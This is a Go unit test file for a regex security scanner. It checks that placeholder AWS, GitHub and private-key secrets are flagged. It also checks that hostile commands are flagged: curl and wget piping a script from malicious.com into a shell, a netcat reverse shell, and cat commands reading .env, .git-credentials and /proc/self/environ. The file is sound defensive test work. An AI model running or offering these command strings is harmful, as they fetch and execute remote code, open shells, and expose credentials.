package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			// Broken up to avoid matching in source code scan
			content:     "var key = \"AKIA" + "IOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			// Broken up to avoid matching in source code scan
			content:     "token = \"ghp_" + "123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			// Broken up to avoid matching in source code scan
			content:     "-----BEGIN " + "RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Curl Pipe Bash",
			// Broken up to avoid matching in source code scan
			content:     "curl https://malicious.com/install.sh | " + "bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Wget Pipe Sh",
			// Broken up to avoid matching in source code scan
			content:     "wget -O - https://malicious.com/install.sh | " + "sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Netcat Reverse Shell",
			// Broken up to avoid matching in source code scan
			content:     "n" + "c -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Cat Env File",
			// Broken up to avoid matching in source code scan
			content:     "c" + "at .env",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Redirection Env",
			// Broken up to avoid matching in source code scan
			content:     "c" + "at<.env",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Git Credentials",
			// Broken up to avoid matching in source code scan
			content:     "c" + "at .git-credentials",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Cat Proc Environ",
			// Broken up to avoid matching in source code scan
			content:     "c" + "at /proc/self/environ",
			wantFinding: "Dangerous Command",
		},
		{
			name:        "Safe Config File",
			content:     "cat my.config",
			wantFinding: "",
		},
		{
			name:        "Safe Config JS",
			content:     "cat src/config.js",
			wantFinding: "",
		},
		{
			name:        "Cat Dot Config",
			// Broken up to avoid matching in source code scan
			content:     "c" + "at .config/config.toml",
			wantFinding: "Dangerous Command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
